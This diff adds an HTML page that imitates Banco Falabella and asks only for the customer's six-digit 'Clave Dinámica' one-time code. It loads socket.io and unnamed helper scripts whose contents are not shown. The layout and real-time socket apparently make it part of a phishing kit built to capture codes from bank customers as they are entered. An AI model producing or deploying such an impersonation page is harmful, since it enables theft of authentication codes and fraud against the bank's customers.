@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco Falabella - Clave Dinámica</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div id="loadingScreen" class="loading-screen">
+        <img src="img/logo-bf-darkmode.aee74748.svg" alt="Logo" class="loading-logo">
+    </div>
+
+    <!-- Main Content -->
+    <div id="mainContent" class="main-container">
+        <!-- Header -->
+        <header class="header">
+            <div class="logo-container">
+                <img src="img/bf-logo-mobile.svg" alt="Banco Falabella" class="logo">
+            </div>
+            <button class="btn-banca-online">Banca en línea</button>
+        </header>
+
+        <!-- Login Form -->
+        <div class="login-container">
+            <form id="dinamicaForm" class="login-form">
+                <div class="form-group">
+                    <label class="form-label">Ingrese su Clave Dinámica</label>
+                </div>
+
+                <div class="form-group">
+                    <input 
+                        type="password" 
+                        id="claveDinamica" 
+                        class="form-input" 
+                        placeholder="Clave Dinámica (6 dígitos)"
+                        maxlength="6"
+                        inputmode="numeric"
+                        autocomplete="off"
+                    >
+                </div>
+
+                <button type="button" id="btnIngresar" class="btn-ingresar" disabled>
+                    INGRESAR
+                </button>
+
+                <div class="link-container">
+                    <a href="#" class="link-clave">¿Necesitas ayuda con tu clave dinámica?</a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/banco-utils.js"></script>
+    <script src="dinamica-optimized.js"></script>
+</body>
+</html>
